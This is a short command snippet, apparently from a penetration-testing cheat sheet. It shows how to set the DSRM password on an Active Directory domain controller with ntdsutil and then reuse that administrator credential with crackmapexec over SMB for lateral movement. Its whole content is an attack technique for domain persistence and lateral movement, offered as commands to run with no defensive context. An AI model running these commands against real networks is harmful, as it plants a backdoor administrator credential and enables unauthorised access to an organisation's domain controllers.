# Set DSRM password (on DC)
ntdsutil
set dsrm password
reset password on server null
q
q

# Use for lateral movement
crackmapexec smb $DC -u administrator -p DSRM_PASSWORD -d domain